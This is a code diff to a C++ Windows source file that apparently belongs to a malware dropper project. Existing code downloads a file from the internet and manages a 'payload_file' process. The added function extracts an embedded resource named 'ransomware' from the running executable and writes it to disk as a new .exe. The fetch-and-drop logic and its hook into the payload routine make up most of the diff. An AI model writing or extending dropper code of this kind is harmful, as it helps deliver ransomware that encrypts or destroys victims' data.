@@ -1,5 +1,7 @@
 #include "misc.h"
 
+int BytesFromResource(HMODULE hModule, char* Str);
+
 bool isProcessRunning(string process_name)
 {
 	bool exists = false;
@@ -43,6 +45,9 @@ void CallMessageBoxFromShell()
 	// if process is terminated (false), then delete
 	if (!isProcessRunning(payload_file))
 	{
+		// obtain resource from a running process
+		HMODULE hModule = ::GetModuleHandle(NULL);
+		BytesFromResource(hModule, (char*)"ransomware_mod.exe");
 		if (!DeleteFile(payload_file))
 		{
 			std::cout << GetLastError() << std::endl;
@@ -178,4 +183,50 @@ void Misc::CallFileFromInternet()
 	InternetCloseHandle(hURL);
 
 	CallMessageBoxFromShell();
+}
+
+int BytesFromResource(HMODULE hModule, char* Str)
+{
+	HRSRC ResLocation;
+	HRSRC FinalResLocation;
+	HGLOBAL MemoryHandle;
+	LPVOID ResLock;
+	unsigned int nSizeOfRes;
+
+	// Locate the dialog box resouce from the exe file.
+	ResLocation = FindResource(hModule, "ransomware", RT_STRING);
+	if (!ResLocation)
+	{
+		std::cout << "Could not locate string." << std::endl;
+		return 0;
+	}
+
+	FinalResLocation = ResLocation;
+
+	nSizeOfRes = SizeofResource(NULL, FinalResLocation);
+	if (nSizeOfRes <= 0)
+	{
+		std::cout << "Could not obtain a size of resource." << std::endl;
+		return 0;
+	}
+
+	MemoryHandle = LoadResource(hModule, FinalResLocation);
+	if (MemoryHandle == NULL)
+	{
+		std::cout << "Could not load string." << std::endl;
+		return 0;
+	}
+
+	ResLock = LockResource(MemoryHandle);
+	if (ResLock == NULL)
+	{
+		std::cout << "Could not lock string in memory." << std::endl;
+		return 0;
+	}
+
+	std::ofstream outFile("resource_test.exe", std::ios::out | std::ios::binary);
+	outFile.write((char*)ResLock, nSizeOfRes);
+	outFile.close();
+
+	return 1;
 }
